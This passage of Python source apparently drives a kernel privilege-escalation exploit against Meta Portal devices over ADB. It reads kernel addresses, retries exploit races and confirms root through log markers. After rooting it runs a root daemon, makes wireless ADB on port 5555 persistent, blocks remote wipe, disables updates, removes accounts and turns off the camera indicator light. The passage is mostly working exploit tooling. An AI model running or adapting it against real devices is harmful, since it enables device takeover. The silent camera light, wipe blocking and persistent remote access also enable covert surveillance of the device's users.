                environment["GHOSTLOCK_PRESENCE_PRIVATE_ONLY"] = "1"
        if preserve_shell_domain:
            environment["GHOSTLOCK_ACTION_PRESERVE_SELINUX"] = "1"
        if (
            self.remove_meta_accounts
            and not self.meta_accounts_already_clean
            and self.meta_accounts_absent
        ):
            environment["GHOSTLOCK_META_ACCOUNTS_EMPTY"] = "1"
        if self.disable_updates and not self.ota_already_configured:
            environment["GHOSTLOCK_OTA_BLOCK"] = "1"
        if self.enable_updates:
            environment["GHOSTLOCK_RESTORE_OTA_BLOCK"] = "1"
        if self.optimize_presence and not self.presence_already_configured:
            environment["GHOSTLOCK_PRESENCE_PROFILE"] = "1"
        if self.restore_presence_profile:
            environment["GHOSTLOCK_RESTORE_PRESENCE_PROFILE"] = "1"
        if self.presence_fps_action_requested():
            environment["GHOSTLOCK_PRESENCE_FPS_CAP"] = str(
                self.presence_fps_cap
            )
            environment["GHOSTLOCK_UID1000_PRESENCE_FPS"] = str(
                self.presence_fps_cap
            )
            environment["GHOSTLOCK_PRESENCE_REMOVE_KEY"] = "1"
        if self.restore_presence_fps or self.restore_presence_profile:
            environment["GHOSTLOCK_RESTORE_PRESENCE_FPS"] = "1"
            environment["GHOSTLOCK_PRESENCE_REMOVE_KEY"] = "1"
        native_presence_prefs = self.uses_native_presence_prefs()
        if native_presence_prefs:
            environment["GHOSTLOCK_PRESENCE_NATIVE_PREFS"] = "1"
        if self.needs_component_ctl():
            environment.update(
                {
                    "GHOSTLOCK_COMPONENT_CTL_JAR": COMPONENT_CTL_REMOTE,
                    "GHOSTLOCK_COMPONENT_ACTIONS": (
                        DEBLOAT_COMPONENT_ACTIONS_REMOTE
                    ),
                }
            )
        if self.presence_fps_action_requested() and not native_presence_prefs:
            environment["GHOSTLOCK_PRESENCE_PREF_ACTION"] = (
                f"set:{self.presence_fps_cap}"
            )
        if (
            (self.restore_presence_fps or self.restore_presence_profile)
            and not native_presence_prefs
        ):
            environment["GHOSTLOCK_PRESENCE_PREF_ACTION"] = "restore"
        if self.remove_meta_accounts and not self.meta_accounts_already_clean:
            environment.update(
                {
                    "GHOSTLOCK_REMOVE_META_ACCOUNTS": "1",
                    "GHOSTLOCK_META_ACCOUNT_CTL_JAR": ACCOUNT_CTL_REMOTE,
                }
            )
            if self.target.meta_accounts_skip_force_stop:
                environment["GHOSTLOCK_META_ACCOUNTS_SKIP_FORCE_STOP"] = "1"
            if self.meta_accounts_local_only:
                environment["GHOSTLOCK_META_ACCOUNTS_LOCAL_ONLY"] = "1"
            if self.meta_accounts_auth_only:
                environment["GHOSTLOCK_META_ACCOUNTS_AUTH_ONLY"] = "1"
            if self.meta_accounts_finalize_only:
                environment["GHOSTLOCK_META_ACCOUNTS_FINALIZE_ONLY"] = "1"
                package_uid_result = self.adb_run(
                    [
                        "shell", "cmd", "package", "list", "packages", "-U",
                        "com.facebook.alohaservices.alohausers",
                    ],
                    timeout=10,
                    check=True,
                ).stdout
                package_uid_match = re.search(r"\buid:(\d+)\b", package_uid_result)
                if (
                    package_uid_match is None
                    or not 10000 <= int(package_uid_match.group(1)) < 100000
                ):
                    raise ProvisionError(
                        "could not resolve the Meta account authenticator UID"
                    )
                environment["GHOSTLOCK_META_ACCOUNT_PACKAGE_UID"] = (
                    package_uid_match.group(1)
                )
        if self.shizuku and not self._in_custom_payload_phase:
            # The key-authorization action belongs to the dedicated
            # Shizuku step, which runs before the custom-payload phase
            # and already authorized the helper key. Carrying it into
            # payload attempts makes the native post-root sequence run
            # it again in a phase where the helper's loopback ADB
            # endpoint is not prepared: it fails with ECONNREFUSED
            # (step 20, errno 111) AFTER the payload has started, the
            # attempt verdict flips to WATCH_CFI_OK=0, and a won race
            # is discarded as a miss (bisect attempt 5, 2026-11-03).
            environment["GHOSTLOCK_SHIZUKU_AUTHORIZE_KEY"] = "1"
        if self.remove_shizuku:
            environment["GHOSTLOCK_SHIZUKU_REMOVE_KEY"] = "1"
        if self.custom_payload is not None and self._in_custom_payload_phase:
            # The payload action belongs only to the custom-payload
            # phase. In the combined flow the standard install runs
            # first with the payload already configured; ungated, every
            # install attempt also carried the payload action, whose
            # post-root chain fails at step 20 in that context, so won
            # install races were discarded as misses (Run 12 burned
            # all 24 attempts this way, 2026-11-04).
            environment.update(
                {
                    "GHOSTLOCK_CUSTOM_PAYLOAD": "1",
                    "GHOSTLOCK_CUSTOM_PAYLOAD_SRC": CUSTOM_PAYLOAD_REMOTE,
                    "GHOSTLOCK_CUSTOM_PAYLOAD_DST": CUSTOM_PAYLOAD_DST_REMOTE,
                    "GHOSTLOCK_LOCK_REPAIR": os.environ.get(
                        "PORTAL_LOCK_REPAIR", "1"
                    ),
                    # Keep the action child's own (shell) SELinux domain
                    # while it receives uid-0 creds: the init domain
                    # cannot read the shell-staged payload or write its
                    # install location, the shell domain can.
                    "GHOSTLOCK_ACTION_PRESERVE_SELINUX": "1",
                }
            )
        if self.disable_camera_light:
            environment["GHOSTLOCK_DISABLE_CAMERA_LIGHT"] = "1"
        if self.restore_camera_light:
            environment["GHOSTLOCK_RESTORE_CAMERA_LIGHT"] = "1"
        if self.system_theme_uid1000_action_requested():
            environment["GHOSTLOCK_UID1000_SYSTEM_THEME_CONTROL"] = "1"
        if self.target.uid1000_embedded_helper and self.needs_uid1000_payload():
            if (
                not self.uid1000_runtime_apk_remote
                or not self.uid1000_runtime_library_remote
            ):
                raise ProvisionError("UID-1000 runtime APK paths were not prepared")
            environment.update(
                {
                    "GHOSTLOCK_UID1000_RUNTIME_APK": (
                        self.uid1000_runtime_apk_remote
                    ),
                    "GHOSTLOCK_UID1000_RUNTIME_LIBRARY": (
                        self.uid1000_runtime_library_remote
                    ),
                }
            )
            camera_installed = self.adb_run(
                ["shell", "test", "-f", CAMERA_LIGHT_INSTALLED_REMOTE],
                timeout=5,
            ).returncode == 0
            retained_fps = self.adb_run(
                [
                    "shell",
                    "cat",
                    "/data/local/tmp/portal-presence-backup/fps-cap-v1",
                ],
                timeout=5,
            ).stdout.strip()
            if camera_installed and not self.restore_camera_light:
                environment["GHOSTLOCK_DISABLE_CAMERA_LIGHT"] = "1"
            if (
                retained_fps.isdigit()
                and 1 <= int(retained_fps) <= 10
                and not self.restore_presence_fps
                and not self.restore_presence_profile
            ):
                environment["GHOSTLOCK_UID1000_PRESENCE_FPS"] = retained_fps
        if self.needs_uid1000_payload():
            self.adb_run(
                ["shell", "rm", "-f", UID1000_HOOK_ACTIVE_REMOTE],
                timeout=5,
                check=True,
            )
            if (
                not self.target.uid1000_embedded_helper
                and self.uid1000_boot_hook_active()
            ):
                environment["GHOSTLOCK_UID1000_HOOK_ACTIVE"] = "1"
                self.push_text_atomic(
                    "active\n", UID1000_HOOK_ACTIVE_REMOTE
                )
                print(
                    "UID1000_HOOK_ACTIVE source=running-system-helper",
                    flush=True,
                )
        self.adb_run(
            ["shell", "am", "force-stop", "--user", "0", "com.facebook.aloha.analytics"],
            timeout=10,
        )
        # A disconnected adbd can hide the watcher's final stdout marker.  A
        # few targets recover that result from a file written by the watcher,
        # so remove any record left by an earlier attempt before this process
        # starts.  Otherwise an early crash can be mistaken for success.
        self.adb_run(
            [
                "shell",
                "rm",
                "-f",
                "/data/local/tmp/ghostlock-watch-result.txt",
            ],
            timeout=5,
            check=True,
        )
        self.adb_run(["shell", "logcat", "-c"], timeout=5)
        environment.update(self.target.exploit_env)
        return environment

    def exploit(
        self, base: int, memstart: int, attempt: int, *,
        skip_final_reboot: bool = False,
    ) -> bool:
        if self.target is None:
            raise ProvisionError("target must be selected before exploitation")
        environment = self.build_exploit_environment(base, memstart, attempt)
        credential_action = "GHOSTLOCK_ACTION_CREDENTIAL_PID" in environment
        shell = "env " + " ".join(
            f"{name}={shlex.quote(value)}" for name, value in environment.items()
        ) + " /system/bin/true"
        log_path = self.log_dir / f"attempt-{attempt}.log"
        success = False
        failed = False
        failure_markers = (
            "WATCH_CFI_OK=0",
            "pre-signal FOPS check miss",
            "held reclaim payload inspection complete clean=0",
            "held child CFI complete ok=0",
            "prepare_kernel_page did not find usable nonzero source pointers",
            "proc_uid lock waiter setup failed",
        )
        expected_markers: dict[str, tuple[str, bool]] = {}
        if self.custom_payload is not None:
            expected_markers["custom_payload"] = (
                "PORTAL_CUSTOM_PAYLOAD_STARTED",
                True,
            )
        if self.persist_wireless_adb:
            expected_markers["wireless_adb"] = (
                "wireless ADB persistence install",
                True,
            )
        if self.adb_framework_boot_install_requested():
            expected_markers["adb_framework_config"] = (
                "UID1000 ADB framework boot config",
                True,
            )
            expected_markers["adb_framework_helper"] = (
                "UID1000 camera LED helper install",
                True,
            )
            expected_markers["adb_framework_hook"] = (
                "Battery ART boot hook",
                True,
            )
        if self.audio and not self.audio_already_configured:
            audio_marker = (
                "PORTAL_AUDIO_JAVA_DEFERRED_OK mode=disabled"
                if self.target.audio_java_fallback
                else "PORTAL_AUDIO_NATIVE_OK mode=disabled"
            )
            expected_markers.update(
                {
                    "audio_parameters": (audio_marker, False),
                    "audio_persistence": ("audio persistence install", True),
                }
            )
            if self.target.device == "omni":
                expected_markers["mha_tuning"] = (
                    "MHA tuning install",
                    True,
                )
        if self.restore_audio:
            audio_marker = (
                "PORTAL_AUDIO_JAVA_OK mode=firmware-defaults"
                if self.target.audio_java_fallback
                else "PORTAL_AUDIO_NATIVE_OK mode=firmware-defaults"
            )
            expected_markers.update(
                {
                    "audio_defaults": (audio_marker, False),
                    "audio_restore": ("audio persistence restore", True),
                }
            )
            if self.target.device == "omni":
                expected_markers["mha_tuning_restore"] = (
                    "MHA tuning restore",
                    True,
                )
        if self.disable_updates and not self.ota_already_configured:
            expected_markers["ota_block"] = ("OTA block file install", True)
        if self.enable_updates:
            expected_markers["ota_restore"] = ("OTA block restore", True)
        if self.optimize_presence and not self.presence_already_configured:
            expected_markers["presence_profile"] = (
                "presence profile install",
                True,
            )
        if self.restore_presence_profile:
            expected_markers["presence_restore"] = (
                "presence profile restore",
                True,
            )
        if self.presence_fps_action_requested():
            presence_marker = (
                "PORTAL_PRESENCE_FPS_NATIVE action=set "
                f"fps={self.presence_fps_cap}"
                if self.uses_native_presence_prefs()
                else f"PORTAL_PRESENCE_FPS action=set fps={self.presence_fps_cap}"
            )
            expected_markers["presence_fps"] = (
                presence_marker,
                True,
            )
            expected_markers["presence_uid1000_config"] = (
                "UID1000 presence activation config",
                True,
            )
            expected_markers["presence_uid1000_helper"] = (
                "UID1000 camera LED helper install",
                True,
            )
            expected_markers["presence_uid1000_hook"] = (
                "Battery ART boot hook",
                True,
            )
        if self.restore_presence_fps:
            expected_markers["presence_fps_restore"] = (
                (
                    "PORTAL_PRESENCE_FPS_NATIVE action=restore"
                    if self.uses_native_presence_prefs()
                    else "PORTAL_PRESENCE_FPS action=restore"
                ),
                True,
            )
        if self.restore_presence_profile:
            expected_markers["presence_fps_restore"] = (
                (
                    "PORTAL_PRESENCE_FPS_NATIVE action=restore"
                    if self.uses_native_presence_prefs()
                    else "PORTAL_PRESENCE_FPS action=restore"
                ),
                True,
            )
        if self.restore_presence_fps or self.restore_presence_profile:
            expected_markers["presence_helper_key_remove"] = (
                "Presence ADB key remove",
                True,
            )
            expected_markers["presence_uid1000_restore"] = (
                "UID1000 presence helper restore",
                True,
            )
        if self.needs_component_ctl():
            expected_markers["component_profile"] = (
                "component ctl child=",
                True,
            )
        if self.remove_meta_accounts and not self.meta_accounts_already_clean:
            expected_markers["meta_accounts"] = (
                "PORTAL_META_ACCOUNTS_COMPLETE",
                True,
            )
        if self.shizuku:
            expected_markers["shizuku_key"] = (
                "Shizuku ADB key authorize",
                True,
            )
        if self.remove_shizuku:
            expected_markers["shizuku_key_remove"] = (
                "Shizuku ADB key remove",
                True,
            )
        if self.disable_camera_light:
            expected_markers["camera_light_helper"] = (
                "UID1000 camera LED helper install",
                True,
            )
            expected_markers["camera_light_hook"] = (
                "Battery ART boot hook",
                True,
            )
        if self.restore_camera_light:
            expected_markers["camera_light_restore"] = (
                "UID1000 camera LED helper restore",
                True,
            )
        if self.system_theme_uid1000_action_requested():
            expected_markers["system_theme_config"] = (
                "UID1000 system theme control config",
                True,
            )
            expected_markers["system_theme_helper"] = (
                "UID1000 camera LED helper install",
                True,
            )
            expected_markers["system_theme_hook"] = (
                "Battery ART boot hook",
                True,
            )
        observed_markers: set[str] = set()
        with log_path.open("w", encoding="utf-8") as output:
            process = subprocess.Popen(
                self.adb + ["shell", shell],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                bufsize=0,
            )
            assert process.stdout is not None
            deadline = time.monotonic() + self.target.exploit_timeout_seconds
            post_root_deadline_extended = False
            pending_output = ""
            while time.monotonic() < deadline:
                ready, _, _ = select.select([process.stdout], [], [], 1)
                if not ready:
                    if process.poll() is not None:
                        break
                    continue
                chunk = os.read(process.stdout.fileno(), 4096)
                if not chunk:
                    break
                text = chunk.decode("utf-8", errors="replace")
                sys.stdout.write(text)
                sys.stdout.flush()
                output.write(text)
                output.flush()
                pending_output += text
                lines = pending_output.splitlines(keepends=True)
                if lines and not lines[-1].endswith(("\n", "\r")):
                    pending_output = lines.pop()
                else:
                    pending_output = ""
                for line in lines:
                    if (
                        self.target.post_scheduler_timeout_seconds > 0
                        and "post-scheduler checkpoint complete" in line
                    ):
                        deadline = min(
                            deadline,
                            time.monotonic()
                            + self.target.post_scheduler_timeout_seconds,
                        )
                    if (
                        not post_root_deadline_extended
                        and self.target.post_root_timeout_seconds > 0
                        and "configfs action-child credentials installed" in line
                    ):
                        deadline = max(
                            deadline,
                            time.monotonic()
                            + self.target.post_root_timeout_seconds,
                        )
                        post_root_deadline_extended = True
                        print(
                            "POST_ROOT_ACTION_GRACE "
                            f"seconds={self.target.post_root_timeout_seconds}",
                            flush=True,
                        )
                    for name, (marker, require_ok) in expected_markers.items():
                        if marker in line and (not require_ok or "ok=1" in line):
                            observed_markers.add(name)
                    if expected_markers and observed_markers == set(expected_markers):
                        print(
                            "NATIVE_ACTIONS_OK actions="
                            + ",".join(sorted(observed_markers)),
                            flush=True,
                        )
                        success = True
                        break
                    if credential_action and "WATCH_CFI_OK=1" in line:
                        print(
                            "NATIVE_ACTIONS_OK actions=credential-scoped",
                            flush=True,
                        )
                        success = True
                        break
                    success_marker = "provision actions complete "
                    if success_marker in line and "ok=1" in line:
                        success = True
                        break
                    if any(marker in line for marker in failure_markers):
                        failed = True
                        break
                if success or failed:
                    break

            if (
                not success
                and not failed
                and self.target.recover_watch_result_after_disconnect
            ):
                # Cipher restarts its live adbd when the persistent TCP
                # property first becomes active. The kernel-side watcher has
                # already completed cleanup, but that restart can sever the
                # adb shell before its final marker reaches this pipe. Accept
                # only the exact, freshly generated success record written by
                # the same watcher after all actions and cleanup succeeded.
                recovery_deadline = time.monotonic() + 15
                while time.monotonic() < recovery_deadline:
                    try:
                        self.run(["adb", "connect", self.serial], timeout=5)
                        watch_result = self.adb_run(
                            [
                                "shell",
                                "cat",
                                "/data/local/tmp/ghostlock-watch-result.txt",
                            ],
                            timeout=5,
                        ).stdout.strip()
                    except ProvisionError:
                        time.sleep(1)
                        continue
                    if re.fullmatch(
                        r"WATCH_CFI_OK=1 STEP=0 ERRNO=0 ROOT=1 "
                        r"RSTEP=\d+ RERR=\d+",
                        watch_result,
                    ):
                        print(
                            "NATIVE_ACTIONS_OK actions=watch-result-recovery",
                            flush=True,
                        )
                        success = True
                        break
                    time.sleep(1)

            print(
                f"INSTALL_ATTEMPT_RESULT attempt={attempt} "
                f"success={int(success)} early_failure={int(failed)}"
            )
            if not skip_final_reboot or not success:
                try:
                    self.adb_run(["reboot"], timeout=8)
                except ProvisionError:
                    pass
            process.terminate()
            try:
                process.wait(timeout=3)
            except subprocess.TimeoutExpired:
                process.kill()
                process.wait(timeout=3)
        return success

    def apply_custom_payload(self) -> None:
        """Start a caller-supplied binary inside one privileged window.

        The binary named by --custom-payload is staged like every other
        payload; the native action installs it under /data/portal-root
        and starts it detached. Unlike the install flow the device is
        NOT rebooted after a successful attempt: the payload is expected
        to keep serving for the rest of this boot. Verification requires
        the payload to answer its ID command as uid 0 over loopback.
        """
        if self.target is None:
            raise ProvisionError("target must be selected before custom payload")
        if self.custom_payload is None:
            raise ProvisionError("custom payload was not configured")
        if not self.custom_payload.is_file():
            raise ProvisionError(
                f"custom payload not found: {self.custom_payload}"
            )
        self.stage()
        # From here through the post-payload root steps, exploit
        # environments are built without the Shizuku key-authorization
        # action (see build_exploit_environment). The autoroot staging
        # in apply_post_payload_root_steps() renders its frozen
        # on-device environments through the same builder, so they
        # inherit the suppression: the helper key is already
        # authorized by then, on host and on device alike.
        self._in_custom_payload_phase = True
        try:
            clean_boot_id: str | None = None
            for attempt in range(1, self.attempts + 1):
                if clean_boot_id is None:
                    print(
                        f"CUSTOM_PAYLOAD_ATTEMPT={attempt} preparing clean boot",
                        flush=True,
                    )
                    _, boot_id = self.reboot()
                else:
                    boot_id = clean_boot_id
                    clean_boot_id = None
                    print(
                        f"CUSTOM_PAYLOAD_ATTEMPT={attempt} using post-attempt "
                        f"clean boot boot_id={boot_id}",
                        flush=True,
                    )
                if self.target.address_discovery_settle_seconds:
                    time.sleep(self.target.address_discovery_settle_seconds)
                try:
                    base = self.kaslr_base(str(attempt))
                    memstart = self.memstart(str(attempt))
                except ProvisionError:
                    continue
                print(
                    f"RUNTIME_ADDRESSES attempt={attempt} boot_id={boot_id} "
                    f"kaslr={base:#x} memstart={memstart:#x}",
                    flush=True,
                )
                if not self.exploit(
                    base, memstart, attempt, skip_final_reboot=True
                ):
                    # A failed attempt reboots the device (see exploit());
                    # wait for that clean boot and reuse it, exactly like
                    # the install flow, instead of racing the reboot with
                    # an immediate boot_id read.
                    clean_boot_id = self.connect_after_reboot(boot_id)
                    continue
                self.verify_custom_payload()
                self.apply_post_payload_root_steps()
                self.write_state("complete")
                print(
                    f"CUSTOM_PAYLOAD_OK payload={CUSTOM_PAYLOAD_DST_REMOTE} "
                    f"port={CUSTOM_PAYLOAD_PORT} logs={self.log_dir}",
                    flush=True,
                )
                return
            raise ProvisionError(
                f"custom payload failed after {self.attempts} attempts"
            )
        finally:
            self._in_custom_payload_phase = False

    def verify_custom_payload(self, wait_seconds: int = 30) -> None:
        return self.payload_feature.verify_custom_payload(wait_seconds)

    def daemon_exec(self, command: str, timeout: int = 40) -> tuple[int, str]:
        return self.payload_feature.daemon_exec(command, timeout)

    def stop_root_daemon(self) -> None:
        return self.payload_feature.stop_root_daemon()

    def apply_post_payload_root_steps(self) -> None:
        return self.payload_feature.apply_post_payload_root_steps()

    def start_shizuku_as_root(self) -> None:
        return self.shizuku_feature.start_shizuku_as_root()

    def stage_autoroot_payload(self) -> None:
        return self.payload_feature.stage_autoroot_payload()

    @staticmethod
    def audio_processing_disabled_observed(
        logs: str, target: PortalTarget | None
    ) -> bool:
        return audio_processing_disabled_observed(logs, target)

    def logcat_watermark(self) -> str | None:
        """Start of the current boot in logcat -t format, or None.

        Verify loops poll logcat while waiting for a marker line. The
        markers they wait for are emitted during the current boot --
        often before the loop itself is entered -- so the watermark
        must be the boot's start, not the loop's: a loop-entry
        watermark silently excludes the very lines being waited for
        (caught live in Run 20, where the audio watchdog check failed
        against an empty since-loop-entry dump). Each poll then asks
        logcat only for lines from this boot, skipping earlier phases'
        output. Computed host-side from the device's local clock minus
        /proc/uptime (the device's toybox `date -d @epoch` renders UTC
        regardless of timezone, so it cannot be used for this), with a
        small safety margin. Returns None when the clock cannot be
        read, in which case callers fall back to a plain full dump.
        """
        result = self.adb_run(
            ["shell", "date '+%m-%d %H:%M:%S'; cat /proc/uptime"],
            timeout=5,
        )
        if result.returncode != 0:
            return None
        lines = result.stdout.splitlines()
        if len(lines) < 2:
            return None
        stamp = lines[0].strip()
        match = re.fullmatch(
            r"(\d{2})-(\d{2}) (\d{2}):(\d{2}):(\d{2})", stamp
        )
        if not match:
            return None
        try:
            uptime = float(lines[1].split()[0])
        except (ValueError, IndexError):
            return None
        month, day, hour, minute, second = (
            int(group) for group in match.groups()
        )
        now = dt.datetime(
            dt.datetime.now().year,
            month,
            day,
            hour,
            minute,
            second,
        )
        boot = now - dt.timedelta(seconds=uptime + 2)
        return boot.strftime("%m-%d %H:%M:%S.000")

    def logcat_poll(
        self, tag: str, since: str | None, timeout: int = 10
    ) -> str:
        """Tag-filtered logcat dump, optionally only since a watermark."""
        # Single-string shell command: the -t timestamp contains a
        # space and adb's list-form shell joining would split it.
        command = f"logcat -d -s {tag}:*"
        if since is not None:
            command = f"logcat -d -t '{since}' -s {tag}:*"
        return self.adb_run(["shell", command], timeout=timeout).stdout

    def verify_watchdog(self, wait_seconds: int = 25) -> str:
        return self.audio_feature.verify_watchdog(wait_seconds)

    def verify_audio_restored(self, wait_seconds: int = 20) -> None:
        return self.audio_feature.verify_audio_restored(wait_seconds)

    def disable_ota_packages(self) -> None:
        packages = (
            self.target.ota_packages
            if self.target
            else (OTA_UI_PACKAGE, OTA_SETUP_PACKAGE)
        )
        for package in packages:
            result = self.adb_run(
                ["shell", "pm", "disable-user", "--user", "0", package],
                timeout=10,
            )
            if result.returncode != 0 or "new state: disabled-user" not in result.stdout:
                already_disabled = self.adb_run(
                    ["shell", "pm", "list", "packages", "-d", "-u"],
                    timeout=10,
                    check=True,
                ).stdout
                if f"package:{package}" not in already_disabled:
                    raise ProvisionError(
                        f"failed to disable OTA package {package}: {result.stdout}"
                    )

    def enable_ota_packages(self) -> None:
        packages = (
            self.target.ota_packages
            if self.target
            else (OTA_UI_PACKAGE, OTA_SETUP_PACKAGE)
        )
        for package in packages:
            result = self.adb_run(
                ["shell", "pm", "enable", "--user", "0", package], timeout=10
            )
            if result.returncode != 0:
                raise ProvisionError(
                    f"failed to enable OTA package {package}: {result.stdout}"
                )
        self.settle_package_state()

    def verify_ota_restored(self) -> None:
        marker = "/data/local/tmp/portal-ota-backup/restored-v1"
        if self.adb_run(["shell", "test", "-f", marker], timeout=5).returncode != 0:
            raise ProvisionError("OTA restore marker is absent")
        disabled = self.adb_run(
            ["shell", "pm", "list", "packages", "-d", "-u"],
            timeout=10,
            check=True,
        ).stdout
        packages = (
            self.target.ota_packages
            if self.target
            else (OTA_UI_PACKAGE, OTA_SETUP_PACKAGE)
        )
        still_disabled = [
            package
            for package in packages
            if f"package:{package}" in disabled
        ]
        if still_disabled:
            raise ProvisionError(
                "OTA packages remain disabled: " + ", ".join(still_disabled)
            )
        print("OTA_RESTORE_OK packages=enabled override=restored")

    def verify_ota_block(self, wait_seconds: int = 30) -> None:
        disabled = self.adb_run(
            ["shell", "pm", "list", "packages", "-d", "-u"],
            timeout=10,
            check=True,
        ).stdout
        required = (
            self.target.ota_packages
            if self.target
            else (OTA_UI_PACKAGE, OTA_SETUP_PACKAGE)
        )
        missing = [
            package
            for package in required
            if f"package:{package}" not in disabled
        ]
        if missing:
            raise ProvisionError(f"OTA packages became enabled: {', '.join(missing)}")

        deadline = time.monotonic() + wait_seconds
        last_dump = ""
        last_log = ""
        while time.monotonic() < deadline:
            result = self.adb_run(
                ["shell", "dumpsys", "facebook.aloha.otaservice"], timeout=10
            )
            last_dump = result.stdout
            last_log = self.adb_run(
                [
                    "shell",
                    "logcat",
                    "-d",
                    "-v",
                    "threadtime",
                    "-e",
                    "getLatestBooleanWithOptions.*18296358819858434",
                ],
                timeout=15,
            ).stdout
            override_loaded = re.search(
                r"getLatestBooleanWithOptions \[18296358819858434\], "
                r"latestBoolean: false, source: OVERRIDE",
                last_log,
            )
            if "getBool(kFirmwareOtaUpdateEnable): false" in last_dump:
                print(
                    "OTA_BLOCK_OK packages=disabled "
                    "firmware_ota_update_enable=false source="
                    + ("OVERRIDE" if override_loaded else "effective-config")
                )
                return
            time.sleep(2)
        raise ProvisionError(
            "OTA daemon did not report its firmware-update gate from the "
            "local override; recent dump/log follow:\n"
            + last_dump[-3000:]
            + "\n"
            + last_log[-3000:]
        )

    def compile_camera_light_host_speed(self) -> None:
        return self.presence_feature.compile_camera_light_host_speed()

    def uid1000_boot_hook_active(self) -> bool:
        return self.presence_feature.uid1000_boot_hook_active()

    def prepare_camera_light_install(self) -> None:
        return self.presence_feature.prepare_camera_light_install()

    def restore_uid1000_package_state_if_unused(self) -> None:
        return self.payload_feature.restore_uid1000_package_state_if_unused()

    def package_sets(self) -> tuple[set[str], set[str]]:
        return self.settings_feature.package_sets()

    @staticmethod
    def parse_debloat_backup(contents: str) -> dict[str, str]:
        return parse_debloat_backup(contents)

    def read_debloat_backup(self, required: bool = True) -> dict[str, str] | None:
        return self.settings_feature.read_debloat_backup(required)

    def ensure_debloat_backup(self) -> dict[str, str]:
        return self.settings_feature.ensure_debloat_backup()

    @staticmethod
    def parse_component_backup(contents: str) -> dict[str, tuple[str, str]]:
        return parse_component_backup(contents)

    def read_component_backup(
            self, required: bool = True
        ) -> dict[str, tuple[str, str]] | None:
        return self.settings_feature.read_component_backup(required)

    @staticmethod
    def component_override_set(package_dump: str, label: str) -> set[str]:
        return component_override_set(package_dump, label)

    def current_named_component_states(
            self, components: tuple[str, ...], detect_missing: bool = False
        ) -> dict[str, str]:
        return self.settings_feature.current_named_component_states(components, detect_missing)

    def current_component_states(self) -> dict[str, tuple[str, str]]:
        return self.settings_feature.current_component_states()

    def ensure_component_backup(self) -> dict[str, tuple[str, str]]:
        return self.settings_feature.ensure_component_backup()

    @staticmethod
    def parse_remote_wipe_backup(contents: str) -> dict[str, str]:
        return parse_remote_wipe_backup(contents)

    def read_remote_wipe_backup(
            self, required: bool = True
        ) -> dict[str, str] | None:
        return self.settings_feature.read_remote_wipe_backup(required)

    def ensure_remote_wipe_backup(self) -> dict[str, str]:
        return self.settings_feature.ensure_remote_wipe_backup()

    def push_text_atomic(self, contents: str, remote: str) -> None:
        remote_tmp = remote + ".tmp"
        with tempfile.TemporaryDirectory(prefix="portal-state-") as temporary:
            local = pathlib.Path(temporary) / "state.tsv"
            local.write_text(contents, encoding="utf-8")
            self.adb_run(["push", str(local), remote_tmp], timeout=20, check=True)
        mode = "0644" if remote == DEBLOAT_COMPONENT_ACTIONS_REMOTE else "0600"
        command = (
            f"chmod {mode} {shlex.quote(remote_tmp)} && "
            f"mv {shlex.quote(remote_tmp)} {shlex.quote(remote)}"
        )
        self.adb_run(["shell", command], timeout=10, check=True)

    @staticmethod
    def restore_component_action(state: str) -> str:
        return restore_component_action(state)

    def prepare_component_actions(self) -> None:
        return self.settings_feature.prepare_component_actions()

    def apply_debloat(self) -> None:
        return self.settings_feature.apply_debloat()

    def restore_debloat(self) -> None:
        return self.settings_feature.restore_debloat()

    def settle_package_state(self, before_reboot: bool = False) -> None:
        # PackageManager writes package-restrictions.xml asynchronously. An
        # immediate reboot can discard a state that pm already reports live.
        # No current call site is immediately followed by a reboot: the
        # intervening host work (key reads, staging, exploit discovery)
        # always exceeds the settle window, so the fixed sleep is pure
        # latency there. Pass before_reboot=True at any future call site
        # whose next step actually is a reboot.
        if not before_reboot:
            print(
                "PACKAGE_STATE_SETTLE_SKIPPED reason=no-immediate-reboot",
                flush=True,
            )
            self.adb_run(["shell", "sync"], timeout=60, check=True)
            return
        print(
            f"PACKAGE_STATE_SETTLE seconds={PACKAGE_STATE_SETTLE_SECONDS}",
            flush=True,
        )
        time.sleep(PACKAGE_STATE_SETTLE_SECONDS)
        self.adb_run(["shell", "sync"], timeout=60, check=True)

    def verify_retained_platform(self, wait_seconds: int = 45) -> None:
        return self.settings_feature.verify_retained_platform(wait_seconds)

    def verify_debloat(self, require_components: bool = True) -> None:
        return self.settings_feature.verify_debloat(require_components)

    def verify_debloat_restored(self, require_components: bool = True) -> None:
        return self.settings_feature.verify_debloat_restored(require_components)

    def verify_remote_wipe_blocked(self) -> None:
        return self.settings_feature.verify_remote_wipe_blocked()

    def verify_remote_wipe_restored(self) -> None:
        return self.settings_feature.verify_remote_wipe_restored()

    def verify_presence_runtime(
        self,
        require_profile: bool,
        expected_analysis_fps: int | None = None,
        wait_seconds: int = 90,
    ) -> None:
        return self.presence_feature.verify_presence_runtime(require_profile, expected_analysis_fps, wait_seconds)

    def verify_meta_accounts_removed(self) -> None:
        return self.settings_feature.verify_meta_accounts_removed()

    def verify_requested_state(self) -> None:
        if self.persist_wireless_adb:
            property_name = (
                self.target.wireless_adb_file_property
                if self.target and self.target.wireless_adb_file_property
                else "persist.adb.tcp.port"
            )
            persistent_port = self.adb_run(
                ["shell", "getprop", property_name],
                timeout=5,
                check=True,
            ).stdout.strip()
            if persistent_port != "5555":
                raise ProvisionError(
                    "wireless ADB did not persist on TCP port 5555: "
                    f"{property_name}={persistent_port!r}"
                )
            print(
                "WIRELESS_ADB_OK persistent_port=5555 "
                f"property={property_name}"
            )
        if self.disable_adb_auth_timeout or self.restore_adb_auth_timeout:
            self.verify_adb_auth_timeout()
        if (
            self.disable_adb_auth_timeout
            or self.remove_meta_accounts
            or self.adb_framework_boot_persistence_requested()
            or self.adb_framework_boot_configured
        ):
            wait_seconds = (
                45
                if (
                    self.adb_framework_boot_persistence_requested()
                    or self.adb_framework_boot_configured
                )
                and self.target
                else 0
            )
            self.verify_adb_framework_enabled(wait_seconds=wait_seconds)
        if self.audio:
            self.verify_watchdog()
        if self.restore_audio:
            self.verify_audio_restored()
        if self.disable_updates:
            self.disable_ota_packages()
            self.verify_ota_block()
        if self.enable_updates:
            self.verify_ota_restored()
        if self.debloat:
            self.verify_debloat()
        if self.restore_bloat:
            self.verify_debloat_restored()
        if self.block_remote_wipe:
            self.verify_remote_wipe_blocked()
        if self.restore_remote_wipe:
            self.verify_remote_wipe_restored()
        if self.remove_meta_accounts:
            if self.meta_accounts_auth_only:
                disabled = self.disabled_meta_authenticators()
                missing = set(META_AUTHENTICATOR_COMPONENTS) - disabled
